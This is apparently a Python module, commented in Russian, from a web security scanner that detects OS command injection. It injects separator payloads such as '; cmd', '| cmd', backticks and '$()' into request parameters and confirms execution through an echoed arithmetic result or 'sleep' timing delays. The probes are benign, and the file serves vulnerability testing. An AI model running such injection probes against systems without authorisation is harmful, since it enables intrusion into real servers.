"""OS command injection: доказательство выполнения, затем time-based blind.

Детерминированная проверка не ищет отражение payload (это даёт ложные срабатывания),
а внедряет арифметику `$((A*B))` внутрь echo: в ответе ищется ТОЛЬКО вычисленный
результат, которого нет в самом payload. Его появление доказывает, что команда
выполнена оболочкой. Вторым шагом — слепая time-based проверка по задержке ответа.
"""

import secrets
import string
import time

from core.module_base import BaseModule
from modules.web.sqli import web_session
from utils import renderer
from utils.concurrency import threaded_map
from utils.crawl import collect_candidates
from utils.web import WebClient, WebRequestError

# Шаблоны разрыва команды; {cmd} подставляется готовой командой оболочки.
SEPARATORS = [
    "; {cmd}", "| {cmd}", "|| {cmd}", "&& {cmd}", "& {cmd}",
    "`{cmd}`", "$({cmd})", "\n{cmd}\n", "'; {cmd} #", '"; {cmd} #',
]


def _marker() -> str:
    return "".join(secrets.choice(string.ascii_lowercase) for _ in range(6))


class CmdiModule(BaseModule):
    name = "cmdi"
    category = "web"
    description = "OS command injection: вычисление команды и time-based blind"
    options = {
        "url": {"default": "", "required": False, "description": "Базовый URL; при crawl URL веб-сервисов сессии"},
        "param": {"default": "", "required": False, "description": "Явный параметр, например host"},
        "method": {"default": "GET", "required": False, "description": "GET или POST для явного параметра"},
        "crawl": {"default": True, "required": False, "description": "Искать параметры в ссылках и формах"},
        "ports": {"default": "", "required": False, "description": "Веб-порты для one-shot"},
        "max_urls": {"default": 10, "required": False, "description": "Лимит кандидатов и страниц обхода"},
        "max_depth": {"default": 1, "required": False, "description": "Глубина обхода"},
        "max_parameters": {"default": 10, "required": False, "description": "Максимум полей одного кандидата"},
        "threads": {"default": 8, "required": False, "description": "Параллельная проверка параметров (1–64)"},
        "time_based": {"default": True, "required": False, "description": "Слепая проверка по задержке sleep"},
        "delay": {"default": 5, "required": False, "description": "Секунды sleep для time-based"},
        "verify": {"default": True, "required": False, "description": "Проверять HTTPS-сертификат"},
    }

    def run(self):
        rows = []
        stats = {"candidates": 0, "tested": 0, "findings": 0}
        self.session.params.setdefault("scan_stats", {})["cmdi"] = stats
        param = str(self.get_option("param") or "")
        threads = max(1, min(64, int(self.get_option("threads"))))
        time_based = bool(self.get_option("time_based"))
        delay = max(1, min(30, int(self.get_option("delay"))))
        # Клиент должен пережить sleep: для time-based поднимаем таймаут.
        timeout = float(self.get_option("timeout"))
        if time_based:
            timeout = max(timeout, delay * 2 + 3)
        with WebClient(timeout=timeout, verify=self.get_option("verify")) as client:
            candidates = collect_candidates(
                web_session(self), client, url=self.get_option("url") or None,
                param=param or None, method=self.get_option("method"), crawl=self.get_option("crawl"),
                max_urls=self.get_option("max_urls"), max_depth=self.get_option("max_depth"),
            )
            tasks = []
            for candidate in candidates:
                indexes = [index for index, (name, _) in enumerate(candidate.params) if not param or name == param]
                for index in indexes[:max(1, min(50, self.get_option("max_parameters")))]:
                    tasks.append((candidate, index))
            stats["candidates"] = len(tasks)

            def probe(task):
                candidate, index = task
                value = candidate.params[index][1]
                result = self._arithmetic_check(client, candidate, index, value)
                if result is None and time_based:
                    result = self._time_check(client, candidate, index, value, delay)
                return result

            for task, result, error in threaded_map(probe, tasks, threads):
                stats["tested"] += 1
                if error is not None:
                    renderer.print_warn(str(error))
                    continue
                if not result:
                    continue
                candidate, index = task
                name = candidate.params[index][0]
                detection, payload, evidence = result
                stats["findings"] += 1
                rows.append((candidate.url, name, candidate.method, payload, evidence))
                self.session.add_finding(
                    f"OS command injection: {name} ({detection})", candidate.url, severity="critical",
                    parameter=name, method=candidate.method, payload=payload, evidence=evidence,
                    detection=detection, module=self.path)
                self.session.add_loot("finding", f"Command injection: {name} ({detection})", candidate.url)
        renderer.print_table("Command injection findings", ["URL", "Parameter", "Method", "Payload", "Evidence"], rows)
        renderer.print_info(f"Кандидатов: {stats['candidates']}, проверено: {stats['tested']}, уязвимостей: {stats['findings']}")

    def _arithmetic_check(self, client, candidate, index, value):
        head, tail = _marker(), _marker()
        first, second = secrets.randbelow(89) + 11, secrets.randbelow(89) + 11
        expected = f"{head}{first * second}{tail}"
        command = f"echo {head}$(({first}*{second})){tail}"
        for separator in SEPARATORS:
            payload = value + separator.format(cmd=command)
            try:
                response = candidate.send(client, index, payload)
            except WebRequestError as exc:
                renderer.print_warn(str(exc))
                continue
            # Вычисленный результат отсутствует в самом payload — значит, его напечатала оболочка.
            if expected in response.text and expected not in payload:
                return "command-exec", payload, f"echoed arithmetic result {expected}"
        return None

    def _time_check(self, client, candidate, index, value, delay):
        for separator in SEPARATORS:
            payload = value + separator.format(cmd=f"sleep {delay}")
            try:
                started = time.monotonic()
                candidate.send(client, index, payload)
                elapsed = time.monotonic() - started
                if elapsed < delay * 0.6:
                    continue
                started = time.monotonic()
                candidate.send(client, index, value)
                baseline = time.monotonic() - started
                if baseline > delay * 0.5:
                    continue
                payload_double = value + separator.format(cmd=f"sleep {delay * 2}")
                started = time.monotonic()
                candidate.send(client, index, payload_double)
                elapsed_double = time.monotonic() - started
            except WebRequestError as exc:
                renderer.print_warn(str(exc))
                continue
            if elapsed_double >= delay * 1.6:
                return ("time-based", payload,
                        f"delay≈{elapsed:.1f}s/{elapsed_double:.1f}s for sleep {delay}/{delay * 2}, baseline≈{baseline:.1f}s")
        return None


Cmdi = CmdiModule
